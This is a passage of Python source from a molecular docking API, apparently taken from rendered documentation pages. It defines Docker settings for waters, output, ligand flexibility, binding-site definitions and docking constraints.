        water = file_name
    else:
        check_input(file_name)
        water = Docker.Settings.WaterFileInfo(file_name, toggle_state, spin_state, movable_distance)

    self._settings.add_water(water._water)


[docs]


def clear_water_files(self):
    '''Remove all water objects from settings.'''
    self._settings.set_gold_waters(tuple())


@property
def water_files(self):
    '''The water datafile settings.

    :returns: tuple of class:`ccdc.docking.Docker.Settings.WaterFileInfo` instances.
    '''
    return tuple(
        Docker.Settings.WaterFileInfo(
            water.path_,
            Docker.Settings.WaterFileInfo._get_toggle_state_text(water.toggle_state_),
            Docker.Settings.WaterFileInfo._get_spin_state_text(water.spin_state_),
            water.distance_
        ) for water in self._settings.waters()
    )


@property
def waters(self):
    '''The waters specified for docking as read in from the input files'''

    # Work around PYAPI-2600 by never creating an empty MoleculeReader.
    # if PYAPI-2600 is fixed this can be changed to
    #
    # return io.MoleculeReader([l.file_name for l in self.water_files])

    files = [l.file_name for l in self.water_files]
    if len(files) > 0:
        return io.MoleculeReader(files)
    else:
        return ()


@property
def reference_ligand_file(self):
    '''Any reference ligand file name set.'''
    return self._settings.ligand_reference_file()


@reference_ligand_file.setter
def reference_ligand_file(self, file_name):
    self._settings.set_ligand_reference_file(file_name)


# Output

@property
def output_directory(self):
    '''Directory to which output will be sent.'''
    return self._settings.directory()


@output_directory.setter
def output_directory(self, dir_name):
    '''Set the output directory.'''
    self._settings.set_directory(dir_name)


@property
def output_file(self):
    '''Output file.

    If this is an empty string then each docking will be in a separate file.
    '''
    return self._settings.concatenated_output()


@output_file.setter
def output_file(self, file_name):
    '''Set the output file.'''
    self._settings.set_concatenated_output(file_name)
    self.output_format = os.path.splitext(file_name)[1][1:]


@property
def output_format(self):
    '''Desired format for output file.'''
    x = self._settings.output_file_format()
    if x == DockingLib.GoldConfFile.MOL2:
        return 'mol2'
    elif x == DockingLib.GoldConfFile.MACCS:
        return 'sdf'
    else:
        return None


@output_format.setter
def output_format(self, value):
    if value.lower() == 'mol2':
        self._settings.set_output_file_format(DockingLib.GoldConfFile.MOL2)
    elif value.lower() == 'sdf':
        self._settings.set_output_file_format(DockingLib.GoldConfFile.MACCS)
    else:
        self._settings.set_output_file_format(DockingLib.GoldConfFile.FILEFORMAT_NOTSET)


# Lone Pairs in Output Files
@property
def save_lone_pairs(self):
    ''' Get or set whether to include lone pairs in output files or not
    (can be True of False: False will mean lone pairs are omitted from output)
    '''
    return self._settings.save_lone_pairs()


@save_lone_pairs.setter
def save_lone_pairs(self, value):
    self._settings.set_save_lone_pairs(bool(value))


@property
def flip_free_corners(self):
    '''Get or set whether to flip ring free corners during docking (can be True or False)
    '''
    return self._settings.flip_free_corners()


@flip_free_corners.setter
def flip_free_corners(self, value):
    self._settings.set_flip_free_corners(bool(value))


@property
def flip_amide_bonds(self):
    '''Get or set whether to flip amide bonds during docking (can be True or False)
    '''
    return self._settings.flip_amide_bonds()


@flip_amide_bonds.setter
def flip_amide_bonds(self, value):
    self._settings.set_flip_amide_bonds(bool(value))


@property
def flip_pyramidal_nitrogen(self):
    '''get or set whether to flip pyramidal nitrogens during docking (can be True or False)
    '''
    return self._settings.flip_pyramidal_N()


@flip_pyramidal_nitrogen.setter
def flip_pyramidal_nitrogen(self, value):
    self._settings.set_flip_pyramidal_N(bool(value))


@property
def flip_planar_nitrogen(self):
    '''Return the current settings for flexibility of planar nitrogens

    .. seealso:: :attr:`set_flip_planar_nitrogen`

    '''
    ring_NHR = self._settings.bond_flexibility_text(self._settings.ring_NHR_flexibility())
    if ring_NHR == 'rot':
        ring_NHR = 'rotate'

    ring_NRR = self._settings.bond_flexibility_text(self._settings.ring_NRR_flexibility())
    if ring_NRR == 'rot':
        ring_NRR = 'rotate'

    return {'setting': self._settings.flip_planar_N(),
            'ring_NHR': ring_NHR, 'ring_NRR': ring_NRR}


[docs]


def set_flip_planar_nitrogen(self, setting, ring_NRR=None, ring_NHR=None):
    '''Set the flip_planar_nitrogen settings

    :param setting: whether to switch this off or on
    :param ring_NRR: whether to fix, flip or rotate ring NRR groups (Can be 'fix', 'flip', 'rotate' or None. \
    None means keep the current setting)
    :param ring_NHR: whether to fix, flip or rotate ring NHR groups (Can be 'fix', 'flip', 'rotate' or None. \
    None means keep the current setting)

    .. seealso:: :attr:`flip_planar_nitrogen`

    '''
    allowed = set(['flip', 'fix', 'rotate', 'rot', None])
    if ring_NRR not in allowed:
        raise ValueError(f'invalid ring_NRR arguemnt: {ring_NRR}')

    if ring_NHR not in allowed:
        raise ValueError(f'invalid ring_NHR arguemnt: {ring_NHR}')

    if ring_NRR is not None:
        self._settings.set_ring_NRR_flexibility(self._settings.bond_flexibility_enum(ring_NRR))

    if ring_NHR is not None:
        self._settings.set_ring_NHR_flexibility(self._settings.bond_flexibility_enum(ring_NHR))

    self._settings.set_flip_planar_N(bool(setting))


@property
def fix_ligand_rotatable_bonds(self):
    '''Set or get the state of fixing rotatable bonds in docked ligands

    * 'all' means all ligand bonds will be held rigid in docking

    * 'all_but_terminal' means all bonds except terminal groups such as hydroxyls, \
    methyls etc will be held rigid

    * 'specific'  means that certain bonds have been set as rigid. It is assumed that the \
    indexes of the atoms involved are valid for all ligands docked, but the API will refer to bonds in \
    the first input ligand expressed in the :class:`Docker.Settings` object. See \
    :attr:`specific_fixed_rotatable_bonds` to interrogate which bonds are held fixed

    * None means no bonds are held rigid


    .. seealso::
        * :func:`add_specific_fixed_rotatable_bond`

        * :func:`remove_specific_fixed_rotatable_bond`

        * :attr:`specific_fixed_rotatable_bonds`

    :return: 'all', 'all_but_terminal','specific' or None
    '''
    if self._settings.ligand_bond_flexibility() == DockingLib.GoldConfFile.ROTATE_BOND:
        return None

    if self._settings.ligand_bond_flexibility() == DockingLib.GoldConfFile.FIX_BOND:
        return 'specific'

    return self._settings.bond_flexibility_text(self._settings.ligand_bond_flexibility())


@fix_ligand_rotatable_bonds.setter
def fix_ligand_rotatable_bonds(self, value):
    if value is None:
        self._settings.set_ligand_bond_flexibility(DockingLib.GoldConfFile.ROTATE_BOND)
    elif value == 'specific':
        if len(self._settings.fixed_bonds()) == 0:
            raise ValueError("Can't set to 'specific' as no fixed bonds have been added")
        else:
            self._settings.set_ligand_bond_flexibility(DockingLib.GoldConfFile.FIX_BOND)
    elif value in ['all', 'all_but_terminal']:
        self._settings.set_ligand_bond_flexibility(self._settings.bond_flexibility_enum(value))
    else:
        raise ValueError(f"Unknown setting '{value}'")


@property
def specific_fixed_rotatable_bonds(self):
    ''' Return the specific bonds that are fixed in docking, or an empty list if none are fixed

    The bonds returned relate to the first loaded ligand in the settings note.

    Will raise an IndexError if no ligands are available but fixed_rotatable_bonds have been read
    in from a GOLD configuration file

    .. seealso::
         * :func:`add_specific_fixed_rotatable_bonds`,

         * :func:`remove_specific_fixed_rotatable_bond`

         * :attr:`fix_ligand_rotatable_bonds`

    :return: a list of bonds that are held fixed (all are bonds in the first input ligand note)
    '''

    def find_bond(pair):
        for bd in self.ligands[0].bonds:
            if sorted([bd.atoms[0].index, bd.atoms[1].index]) == sorted([pair[0] - 1, pair[1] - 1]):
                return bd
        return None

    return [x for x in [find_bond(pair) for pair in self._settings.fixed_bonds()] if x is not None]


[docs]


def add_specific_fixed_rotatable_bond(self, bond):
    '''Set a specific rotatable bond, or a list or rotatable bonds as fixed in docking.

    The index of the two atoms forming each bond passed in will ultimately be used
    in the docking, and so if docking multiple ligands, bonds relating to
    these indexes will be fixed for all of them.

    .. seealso::
         * :attr:`specific_fixed_rotatable_bonds`,

         * :func:`remove_specific_fixed_rotatable_bond`

         * :attr:`fix_ligand_rotatable_bonds`

    :param bond: the bond to add, or a list of bonds to add
    '''

    def find_pair(bond):
        for pair in self._settings.fixed_bonds():
            if sorted([bond.atoms[0].index, bond.atoms[1].index]) == sorted([pair[0] - 1, pair[1] - 1]):
                return pair
        return None

    try:
        if find_pair(bond) is not None:
            return

        ids = sorted([bond.atoms[0].index + 1, bond.atoms[1].index + 1])
        self._settings.add_fixed_bond(ids[0], ids[1])
        self.fix_ligand_rotatable_bonds = 'specific'
    except AttributeError:
        try:
            [self.add_specific_fixed_rotatable_bond(b) for b in bond]
        except ValueError:
            raise ValueError(f"Can't set specific rotatable bonds - invalid argument {bond}")


[docs]


def remove_specific_fixed_rotatable_bond(self, bond):
    '''Remove a specific rotatable bond or a list or rotatable bonds that were previously added

     .. seealso::
         * :attr:`specific_fixed_rotatable_bonds`,

         * :func:`add_specific_fixed_rotatable_bond`

         * :attr:`fix_ligand_rotatable_bonds`

    :param bond: the bond to remove, or a list of bonds to remove
    '''
    try:
        ids = [bond.atoms[0].index + 1, bond.atoms[1].index + 1]
        fixed_bonds = self._settings.fixed_bonds()
        bonds_to_set = [f for f in fixed_bonds if f not in [(ids[0], ids[1]), (ids[1], ids[0])]]

        if len(fixed_bonds) == len(bonds_to_set):
            return

        self._settings.set_fixed_bonds(bonds_to_set)

        if self.fix_ligand_rotatable_bonds == 'specific' and \
                len(self._settings.fixed_bonds()) == 0:
            self.fix_ligand_rotatable_bonds = None

    except AttributeError:
        try:
            [self.remove_specific_fixed_rotatable_bond(b) for b in bond]
        except ValueError:
            raise ValueError(f"Can't set specific rotatable bonds - invalid argument {bond}")


@property
def match_template_conformations(self):
    '''Get or set whether to match template conformations of rings during docking
       (can be True or False)
    '''
    return self._settings.match_ring_templates()


@match_template_conformations.setter
def match_template_conformations(self, value):
    self._settings.set_match_ring_templates(bool(value))


@property
def detect_internal_hydrogen_bonds(self):
    '''Get or set whether to detect and score internal hydrogen bonds in ligands during docking
       (can be True or False)
    '''
    return self._settings.allow_internal_ligand_hbonds()


@detect_internal_hydrogen_bonds.setter
def detect_internal_hydrogen_bonds(self, value):
    self._settings.set_allow_internal_ligand_hbonds(bool(value))


@property
def rotate_carboxylic_hydroxyl_groups(self):
    '''get or set whether to rotate carboxylic hydroxyl group during docking
    :param setting: a string that can be one of 'flip', 'fix' or 'rotate'
    '''
    value = self._settings.bond_flexibility_text(self._settings.carboxylic_OH_flexibility())

    # Lower level code uses 'rot' as the keyword but writes 'rotate'!
    if value == 'rot': value = 'rotate'
    return value


@rotate_carboxylic_hydroxyl_groups.setter
def rotate_carboxylic_hydroxyl_groups(self, setting):
    if setting not in ('flip', 'fix', 'rotate'):
        raise ValueError("carboxylic rotation setting must be one of flip,fix or rotate")
    self._settings.set_carboxylic_OH_flexibility(self._settings.bond_flexibility_enum(setting))


# fitting points
@property
def fitting_points_file(self):
    '''A file to read or write the fitting points.'''
    if not self._settings.fitting_points_file():
        self._settings.set_fitting_points_file('fit_pts.mol2')
    return self._settings.fitting_points_file()


@fitting_points_file.setter
def fitting_points_file(self, file_name):
    if not file_name:
        self._settings.set_fitting_points_file('fit_pts.mol2')
        self._settings.set_read_fitting_points(False)
    else:
        self._settings.set_fitting_points_file(file_name)
        self._settings.set_read_fitting_points(True)


# Binding site

@property
def binding_site(self):
    ''' Set or get the binding site configuration for this docking.

    :parameter value: should be a :class:`Docker.Settings.BindingSite` object (or derived class.)

    .. seealso::
        * :class:`Docker.Settings.BindingSite` and related classes

        * :attr:`Docker.Settings.detect_cavity`
    '''
    return self._binding_site


@binding_site.setter
def binding_site(self, value):
    self._binding_site = value


@property
def save_binding_site_atoms(self):
    '''Whether or not to write the binding site atom file.'''
    return self._save_binding_site_atoms


@save_binding_site_atoms.setter
def save_binding_site_atoms(self, value):
    self._save_binding_site_atoms = bool(value)


@property
def detect_cavity(self):
    '''Set or get whether to detect the cavity from the binding site definition or not
    (i.e. post-process the binding site)

    :parameter value: True if cavity detection should be switched on, False otherwise
    :raises: RuntimeError if no binding site is set
    :return: The setting of cavity detection

    .. seealso::
        * :class:`Docker.Settings.BindingSite` and related classes

        * :attr:`Docker.Settings.binding_site`
    '''
    if self.binding_site is not None:
        return self.binding_site.detect_cavity
    else:
        raise RuntimeError('No binding site is set, the setting of detect_cavity cannot be established')


@detect_cavity.setter
def detect_cavity(self, value):
    if self.binding_site is not None:
        self.binding_site.detect_cavity = bool(value)
    else:
        raise RuntimeError('No binding site is set, so detect_cavity cannot be set')


@property
def solvate_all(self):
    '''Get or set whether to treat all fitting points associated with solvent-accessible donors or acceptors as
       themselves solvent-accessible. (See the GOLD conf file documentation for more information)
       (can be True or False)
    '''
    return self._settings.solvate_all()


@solvate_all.setter
def solvate_all(self, value):
    self._settings.set_solvate_all(bool(value))


[docs]


def write(self, file_name):
    '''Write docking settings to a GOLD configuration file

    Note that calling this method writes a self-contained configuration file
    but may also cause copying of other files to locations relative to
    the configuration file, so file names in the calling settings object
    will change to point to these copies.

    No tests are performed to check for over-writing of files when calling write.

    :param file_name: The path of the output GOLD configuration file
    :raises: RuntimeError if no fitness and rescore function is set
    '''
    if not self.fitness_function and not self.rescore_function:
        raise RuntimeError('No fitness or rescore function set')
    self._conf_file_name = file_name
    self.make_absolute_file_names(file_name, relative=True)
    constraints = self.constraints
    if self.binding_site is not None:
        self.binding_site._to_settings(self)
    for c in constraints:
        c._write_mol_files(self)
        c._constraint.from_string(c._to_string())
    for p in self.protein_files:
        for c in p.constraints:
            c._write_mol_files(self)
            c._constraint.from_string(c._to_string())
    if self.save_binding_site_atoms:
        with open(os.path.join(os.path.dirname(self.conf_file), 'cavity.atoms'), 'w') as writer:
            for i, a in enumerate(self.binding_site.atoms):
                if i and i % 10 == 0:
                    writer.write('\n')
                writer.write('%s%d' % ('' if i % 10 == 0 else ' ', a.index + 1))
            writer.write('\n\n')

    writer = DockingLib.GoldConfFileWriter(self._settings)
    writer.write(file_name)


[docs]


@nested_class('Docker.Settings')
class BindingSite(Protein.BindingSite):
    def __init__(self):
        '''Initialise a binding site definition.'''
        self.detect_cavity = True

    def _to_settings(self, settings):
        settings._settings.set_detect_cavity(self.detect_cavity)
        settings._settings.set_cavity_origin((0, 0, 0))
        settings._settings.set_cavity_radius(10)
        settings._settings.set_floodfill_atom_no(0)
        settings._settings.set_cavity_file('')
        settings._settings.set_cavity_contact_distance(10)

    @staticmethod
    def _from_settings(settings):
        _mode_dict = {
            DockingLib.GoldConfFile.CAVITY_FROM_POINT: Docker.Settings.BindingSiteFromPoint,
            DockingLib.GoldConfFile.CAVITY_FROM_ATOM: Docker.Settings.BindingSiteFromAtom,
            DockingLib.GoldConfFile.CAVITY_FROM_RESIDUE: Docker.Settings.BindingSiteFromResidue,
            DockingLib.GoldConfFile.CAVITY_FROM_LIST_OF_ATOMS: Docker.Settings.BindingSiteFromListOfAtoms,
            DockingLib.GoldConfFile.CAVITY_FROM_LIST_OF_RESIDUES: Docker.Settings.BindingSiteFromListOfResidues,
            DockingLib.GoldConfFile.CAVITY_FROM_LIGAND: Docker.Settings.BindingSiteFromLigand
        }
        klass = _mode_dict[settings._settings.cavity_definition_mode()]
        return klass._from_settings(settings)


[docs]


class BindingSiteFromPoint(Protein.BindingSiteFromPoint, BindingSite):
    '''A cavity defined from a point.'''

    def __init__(self, protein, origin=(0, 0, 0), distance=12.):
        Protein.BindingSiteFromPoint.__init__(self, protein, origin, distance)
        Docker.Settings.BindingSite.__init__(self)

    def _to_settings(self, settings):
        super(self.__class__, self)._to_settings(settings)
        settings._settings.set_cavity_origin(self.origin)
        settings._settings.set_cavity_radius(self.distance)
        settings._settings.set_cavity_definition_mode(DockingLib.GoldConfFile.CAVITY_FROM_POINT)

    @staticmethod
    def _from_settings(settings):
        pt = settings._settings.cavity_origin()
        bs = Docker.Settings.BindingSiteFromPoint(
            None,
            Coordinates(pt.x(), pt.y(), pt.z()),
            settings._settings.cavity_radius()
        )
        bs.detect_cavity = settings._settings.detect_cavity()
        return bs


[docs]


class BindingSiteFromAtom(Protein.BindingSiteFromAtom, BindingSite):
    '''A cavity defined from a protein atom.'''

    def __init__(self, protein, atom, distance):
        Protein.BindingSiteFromAtom.__init__(self, protein, atom, distance)
        Docker.Settings.BindingSite.__init__(self)

    def _to_settings(self, settings):
        super(self.__class__, self)._to_settings(settings)
        settings._settings.set_floodfill_atom_no(self.atom.index + 1)
        settings._settings.set_cavity_radius(self.distance)
        settings._settings.set_cavity_origin(self.atom.coordinates)
        settings._settings.set_cavity_definition_mode(DockingLib.GoldConfFile.CAVITY_FROM_ATOM)

    @staticmethod
    def _from_settings(settings):
        p = settings.proteins[0]
        at = p.atoms[settings._settings.floodfill_atom_no() - 1]
        bs = Docker.Settings.BindingSiteFromAtom(settings.proteins[0], at, settings._settings.cavity_radius())
        bs.detect_cavity = settings._settings.detect_cavity()
        return bs


[docs]


class BindingSiteFromResidue(Protein.BindingSiteFromResidue, BindingSite):
    '''A cavity defined from a protein residue.'''

    def __init__(self, protein, residue, distance):
        Protein.BindingSiteFromResidue.__init__(self, protein, residue, distance)
        Docker.Settings.BindingSite.__init__(self)

    def _to_settings(self, settings):
        super(self.__class__, self)._to_settings(settings)
        settings._settings.set_floodfill_atom_no(self.residue.atoms[0].index)
        settings._settings.set_cavity_radius(self.distance)
        settings._settings.set_cavity_definition_mode(DockingLib.GoldConfFile.CAVITY_FROM_RESIDUE)

    @staticmethod
    def _from_settings(settings):
        p = settings.proteins[0]
        at = p.atoms[settings._settings.floodfill_atom_no()]
        for res in p.residues:
            if at in res.atoms:
                break
        else:
            raise RuntimeError('The atom %s does not appear to be in a residue.' % str(at))
        bs = Docker.Settings.BindingSiteFromResidue(
            p, res, settings._settings.cavity_radius()
        )
        bs.detect_cavity = settings._settings.detect_cavity()
        return bs


[docs]


class BindingSiteFromListOfAtoms(Protein.BindingSiteFromListOfAtoms, BindingSite):
    def __init__(self, protein, atoms):
        Protein.BindingSiteFromListOfAtoms.__init__(self, protein, atoms)
        Docker.Settings.BindingSite.__init__(self)

    def _to_settings(self, settings):
        super(self.__class__, self)._to_settings(settings)
        if settings._settings.cavity_file():
            file_name = os.path.join(os.path.dirname(settings.conf_file),
                                     os.path.basename(settings._settings.cavity_file()))
            settings._settings.set_cavity_file(file_name)

        else:
            file_name = os.path.join(os.path.dirname(settings.conf_file), 'cavity.atoms')

        with open(file_name, 'w') as writer:
            for i, a in enumerate(self.atoms):
                if i and i % 10 == 0:
                    writer.write('\n')
                writer.write('%d ' % (a.index + 1))  # Cavity atom file is indexed from 1
        settings._settings.set_cavity_file(file_name)
        settings._settings.set_cavity_definition_mode(DockingLib.GoldConfFile.CAVITY_FROM_LIST_OF_ATOMS)

    @staticmethod
    def _from_settings(settings):
        file_name = os.path.join(os.path.dirname(settings.conf_file), settings._settings.cavity_file())
        if not os.path.exists(file_name):
            raise RuntimeError('The cavity file %s does not exist' % file_name)
        with open(file_name) as f:
            indices = [int(i) for i in f.read().split()]
        prot = settings.proteins[0]
        prot_atoms = prot.atoms
        # cavity.atoms file is indexed from 1 rather than 0
        inxs = [i - 1 for i in indices if i - 1 < len(prot_atoms)]
        bs = Docker.Settings.BindingSiteFromListOfAtoms(
            prot, tuple(prot_atoms[i] for i in inxs)
        )
        bs.detect_cavity = settings._settings.detect_cavity()
        return bs


[docs]


class BindingSiteFromListOfResidues(Protein.BindingSiteFromListOfResidues, BindingSite):
    '''Cavity defined from a list of residues.'''

    def __init__(self, protein, residues):
        Protein.BindingSiteFromListOfResidues.__init__(self, protein, residues)
        Docker.Settings.BindingSite.__init__(self)

    def _to_settings(self, settings):
        super(self.__class__, self)._to_settings(settings)
        file_name = os.path.join(os.path.dirname(settings.conf_file), 'cavity.residues')
        settings._settings.set_cavity_file(file_name)
        with open(file_name, 'w') as writer:
            writer.write('> <Gold.Protein.ActiveResidues>\n')
            for i, r in enumerate(self.residues):
                if i and i % 8 == 0:
                    writer.write('\n')
                writer.write('%s ' % r.identifier)
            writer.write('\n\n')
        settings._settings.set_cavity_definition_mode(DockingLib.GoldConfFile.CAVITY_FROM_LIST_OF_RESIDUES)

    @staticmethod
    def _from_settings(settings):
        file_name = os.path.join(os.path.dirname(settings.conf_file), settings._settings.cavity_file())
        if not os.path.exists(file_name):
            raise RuntimeError('The cavity file %s does not exist' % file_name)
        p = settings.proteins[0]
        with open(file_name) as f:
            lines = f.readlines()[1:]
        text = ' '.join(lines)
        residue_names = set(text.split())
        name_dic = {r.identifier: r for r in p.residues}
        no_chain_dic = collections.defaultdict(list)
        for r in p.residues:
            no_chain_dic[r.identifier[r.identifier.index(':') + 1:]].append(r)

        residues = []
        for n in residue_names:
            if n in name_dic:
                residues.append(name_dic[n])
            elif n in no_chain_dic:
                if len(no_chain_dic[n]) == 1:
                    residues.append(no_chain_dic[n][0])
                else:
                    raise RuntimeError('Ambiguous residue name %s' % n)
            else:
                raise RuntimeError('Residue name %s not found in protein' % n)
        if len(residues) != len(residue_names):
            raise RuntimeError('The number of residues and the number of residue names do not match')
        bs = Docker.Settings.BindingSiteFromListOfResidues(p, residues)
        bs.detect_cavity = settings._settings.detect_cavity()
        return bs


[docs]


class BindingSiteFromLigand(Protein.BindingSiteFromMolecule, BindingSite):
    '''A cavity defined from a ligand and a contact distance.'''

    def __init__(self, protein, ligand, distance=6.0, whole_residues=False):
        """
        :param protein: the protein used in the docking
        :param ligand: the ligand used to define the extent of the binding site
        :param distance: the distance threshold for inclusion in the cavity definition
        :param whole_residues: expand any included atom to include all atoms of that protein residue
        """
        Protein.BindingSiteFromMolecule.__init__(self, protein, ligand, distance, whole_residues=whole_residues)
        Docker.Settings.BindingSite.__init__(self)

    def _to_settings(self, settings):
        super(self.__class__, self)._to_settings(settings)
        if settings._settings.cavity_file() and settings._settings.cavity_file().endswith('.mol2'):
            file_name = os.path.join(os.path.dirname(settings.conf_file),
                                     os.path.basename(settings._settings.cavity_file()))
            settings._settings.set_cavity_file(file_name)
        else:
            file_name = os.path.join(os.path.dirname(settings.conf_file),
                                     'cavity_%s.mol2' % self.molecule.identifier.replace(':', '_'))
        with io.MoleculeWriter(file_name) as writer:
            writer.write(self.molecule)
        settings._settings.set_cavity_file(file_name)
        settings._settings.set_cavity_contact_distance(self.distance)
        settings._settings.set_cavity_radius(self.distance)
        settings._settings.set_use_whole_residues(self.whole_residues)
        settings._settings.set_cavity_definition_mode(DockingLib.GoldConfFile.CAVITY_FROM_LIGAND)

    @staticmethod
    def _from_settings(settings):
        file_name = os.path.join(settings.conf_file, settings._settings.cavity_file())
        with io.MoleculeReader(file_name) as reader:
            ligand = reader[0]
        bs = Docker.Settings.BindingSiteFromLigand(
            settings.proteins[0],
            ligand,
            settings._settings.cavity_contact_distance(),
            settings._settings.use_whole_residues()
        )
        bs.detect_cavity = settings._settings.detect_cavity()
        return bs


# Constraints

[docs]


@nested_class('Docker.Settings')
class Constraint(object):
    '''A docking constraint.
    This is the base class for all constraint and restraint like objects that GOLD can
    use in docking.
    '''

    def __init__(self, _constraint=None):
        self._constraint = _constraint

    @staticmethod
    def _make_constraint(settings, _constraint, protein_file=None):
        _class_map = dict(
            distance=Docker.Settings.DistanceConstraint,
            h_bond=Docker.Settings.HBondConstraint,
            protein_h_bond=Docker.Settings.ProteinHBondConstraint,
            substructure=Docker.Settings.SubstructureConstraint,
            similarity=Docker.Settings.TemplateSimilarityConstraint,
            scaffold=Docker.Settings.ScaffoldMatchConstraint,
            sphere=Docker.Settings.RegionConstraint,
            pharmacophore=Docker.Settings.PharmacophoreConstraint
        )
        return _class_map[_constraint.type()]._from_string(settings, _constraint=_constraint, protein_file=protein_file)

    def _write_mol_files(self, settings):
        pass

    @staticmethod
    def _is_protein_atom(atom):
        for i in range(atom._molecule.natoms()):
            a = atom._molecule.atom(i)
            annos = a.annotations()
            if annos and AnnotationsLib.has_ProteinSubstructureData(annos):
                psd = annos.find_ProteinSubstructureData()
                if not psd.heterogen():
                    return True
        return False


[docs]


class DistanceConstraint(Constraint):
    r'''A distance constraint.

    A distance constraint adds a quadratic penalty function into  a docking that penalizes the score by
    wd\ :sup:`2` where w is a weight, and d is the deviation of a given distance between a protein atom and a
    ligand atom from the limits specified.

    The constraint can be set so that all distances between topologically equivalant to those specified are
    tested. In this case, only one distance needs to fall inside the specified bounds to avoid a penalty.

    :param atom1, atom2: :class:`ccdc.molecule.Atom` instances.  These may be either protein or ligand atoms.
    :param limits: range of values with no penalty.
    :param weight: spring constant
    :param topological_equivalent: whether or not to accept a topologically equivalent atom
    '''

    def __init__(self, atom1, atom2, limits=(1.5, 3.5), weight=5.0, topological_equivalent=False, _constraint=None):
        self.atom1 = atom1
        self.atom2 = atom2
        self.limits = (min(limits), max(limits))
        self.weight = weight
        self.topological_equivalent = topological_equivalent
        if _constraint is None:
            _constraint = DockingLib.GoldDistanceConstraint()
            _constraint.from_string(self._to_string())
        super(self.__class__, self).__init__(_constraint)
        if self._is_protein_atom(atom1):
            self._add_to_protein = atom1._molecule
        elif self._is_protein_atom(atom2):
            self._add_to_protein = atom2._molecule

    def _to_string(self):
        s = '%s %d %s %d %.4f %.4f %.4f %s' % (
            'protein' if self._is_protein_atom(self.atom1) else 'ligand',
            self.atom1.index + 1,
            'protein' if self._is_protein_atom(self.atom2) else 'ligand',
            self.atom2.index + 1,
            max(self.limits),
            min(self.limits),
            self.weight,
            'on' if self.topological_equivalent else 'off'
        )
        return s

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        parts = _constraint.to_string().split()
        if parts[0] == 'protein':
            atom1 = settings.proteins[0].atoms[int(parts[1]) - 1]
        else:
            atom1 = settings.ligands[0].atoms[int(parts[1]) - 1]
        if parts[2] == 'protein':
            atom2 = settings.proteins[0].atoms[int(parts[3]) - 1]
        else:
            atom2 = settings.ligands[0].atoms[int(parts[3]) - 1]
        limits = (float(parts[4]), float(parts[5]))
        weight = float(parts[6])
        topological_equivalent = parts[7] == 'on'
        return Docker.Settings.DistanceConstraint(
            atom1, atom2, limits, weight, topological_equivalent, _constraint
        )


[docs]


class HBondConstraint(Constraint):
    '''An HBond constraint.

    An HBond constraint expresses that a given hydrogen bond should be formed between a protein and a ligand atom.
    In this case, this means that the respective scoring  function's score for an H-Bond must be attractive for
    this particular H-Bond. The atoms involved are also always forced to map to one another in the docking mapping
    algorithm.

    :param atom1, atom2: :class:`ccdc.molecule.Atom` instances.

    One of the atoms should be a donatable hydrogen, the other a HBond acceptor atom.  One atom should be on
    the protein, the other on a ligand.
    '''

    def __init__(self, atom1, atom2, _constraint=None):
        if self._is_protein_atom(atom1):
            self._add_to_protein = atom1._molecule
            if self._is_protein_atom(atom2):
                raise RuntimeError('HBond must be between a ligand atom and a protein atom')
            self.atom1 = atom2
            self.atom2 = atom1
        elif not self._is_protein_atom(atom2):
            raise RuntimeError('HBond must be between a ligand atom and a protein atom')
        else:
            self._add_to_protein = atom2._molecule
            self.atom1 = atom1
            self.atom2 = atom2
        if self.atom1 is not None and self.atom2 is not None:
            if not (
                    (self.atom1.atomic_number == 1 and self.atom1.neighbours[0].is_donor and self.atom2.is_acceptor) or
                    (self.atom1.is_acceptor and self.atom2.atomic_number == 1 and self.atom2.neighbours[0].is_donor)
            ):
                raise RuntimeError('The specified atoms do not form an HBond')

        if _constraint is None:
            _constraint = DockingLib.GoldHBondConstraint()
            _constraint.from_string(self._to_string())
        super(self.__class__, self).__init__(_constraint)

    def _to_string(self):
        s = '%s %d %s %d' % (
            'protein' if self._is_protein_atom(self.atom1) else 'ligand',
            self.atom1.index + 1,
            'protein' if self._is_protein_atom(self.atom2) else 'ligand',
            self.atom2.index + 1
        )
        return s

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        parts = _constraint.to_string().split()
        if parts[0] == 'protein':
            atom1 = settings.proteins[0].atoms[int(parts[1]) - 1]
        else:
            atom1 = settings.ligands[0].atoms[int(parts[1]) - 1]
        if parts[2] == 'protein':
            atom2 = settings.proteins[0].atoms[int(parts[3]) - 1]
        else:
            atom2 = settings.ligands[0].atoms[int(parts[3]) - 1]
        return Docker.Settings.HBondConstraint(atom1, atom2, _constraint)


[docs]


class ProteinHBondConstraint(Constraint):
    '''A Protein HBond constraint.

    This constraint forces specfic protein donors or acceptors to form a hydrogen bond if possible to at least one
    ligand atom. Unlike the :class:`ccdc.docking.Docker.Settings.HBondConstraint` this constraint only requires
    the user to specify atoms in the protein; any complementary atom in the ligand will be considered.

    :param atoms: a list :class:`ccdc.molecule.Atom` instances from the protein.  The atoms should be donatable hydrogens or acceptor atoms.
    :param weight: the penalty to be applied for no atom of the list forming an HBond.
    :param min_hbond_score: the minimal score of an HBond to be considered a valid HBond.
    '''

    def __init__(self, atoms, weight=10.0, min_hbond_score=0.005, _constraint=None):
        self.atoms = atoms[:]
        for a in self.atoms:
            if not self._is_protein_atom(a):
                raise RuntimeError('One of the atoms is not in the protein')
            if (
                    not (a.atomic_number == 1 and a.neighbours[0].is_donor) and
                    not (a.is_acceptor)
            ):
                raise RuntimeError('One of the atoms does not form an HBond')
        self._add_to_protein = atoms[0]._molecule
        self.weight = weight
        self.min_hbond_score = min_hbond_score
        if _constraint is None:
            _constraint = DockingLib.GoldProteinHBondConstraint()
            _constraint.from_string(self._to_string())
        super(self.__class__, self).__init__(_constraint)

    def _to_string(self):
        s = '%.4f %.4f %s' % (
            self.weight, self.min_hbond_score, ' '.join(str(a.index + 1) for a in self.atoms)
        )
        return s

    @staticmethod
    def _from_string(settings, _constraint, protein_file=None):
        parts = _constraint.to_string().split()
        weight = float(parts[0])
        min_hbond_score = float(parts[1])
        # Can't get from settings.proteins since they read the constraints
        file_name = os.path.join(os.path.dirname(settings.conf_file), protein_file)
        prot = Protein.from_file(os.path.join(os.path.dirname(settings.conf_file), protein_file))
        pats = prot.atoms
        ats = [pats[int(i) - 1] for i in parts[2:]]
        return Docker.Settings.ProteinHBondConstraint(ats, weight, min_hbond_score)


[docs]


class SubstructureConstraint(Constraint):
    '''A Substructure constraint.

    This constraint allows a user to express a substructure to match onto a ligand and then express a distance constraint with respect to an atom in that substructure.

    Note that a ligand will still be docked if it does not contain the substructure. If you wish
